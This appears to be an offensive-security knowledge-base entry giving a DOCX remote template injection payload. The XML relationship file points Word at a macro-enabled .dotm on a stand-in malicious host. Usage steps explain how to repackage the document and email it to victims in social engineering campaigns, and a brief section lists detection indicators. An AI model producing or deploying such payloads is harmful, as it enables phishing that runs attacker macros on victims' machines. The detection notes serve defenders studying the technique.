---
id: dd439560-0ee1-4e6c-a08b-1f7ba340b443
name: DOCX-External-Template-Relationship-XML
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:23.897302+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Office
tags:
  - docx
  - xml
  - template-injection
  - rels
validated: true
---

# DOCX-External-Template-Relationship-XML

## Code

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://maliciouswebsite.com/macro.dotm" TargetMode="External"/></Relationships>
```

## Description

This XML snippet defines the relationships for a DOCX file's settings, specifically adding an external reference to a remote macro-enabled template (.dotm). When placed in word/_rels/settings.xml.rels, it causes Microsoft Word to load the remote template on document open, potentially executing malicious macros if enabled.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Target | URL to the malicious .dotm template (replace in the code before use) | http://maliciouswebsite.com/macro.dotm |
| Id | Unique relationship ID (increment if appending to existing rels) | rId1 |

## Usage

After unzipping a .docx, save this XML as word/_rels/settings.xml.rels (overwrite or append <Relationship> to existing). Repackage the ZIP as .docx and send via email. The victim must open in Word and enable content for execution. Use in social engineering campaigns targeting Office users.

## Detection

- Scan rels files for 'attachedTemplate' with 'TargetMode="External"' using XML parsers or grep.
- Office Protected View warnings or macro prompts on open.
- Network logs showing fetches to unexpected .dotm URLs.
- EDR alerts on VBA macro execution from templates.

## Related

- [[procedures/Create-DOCX-with-Remote-Template-Injection]]
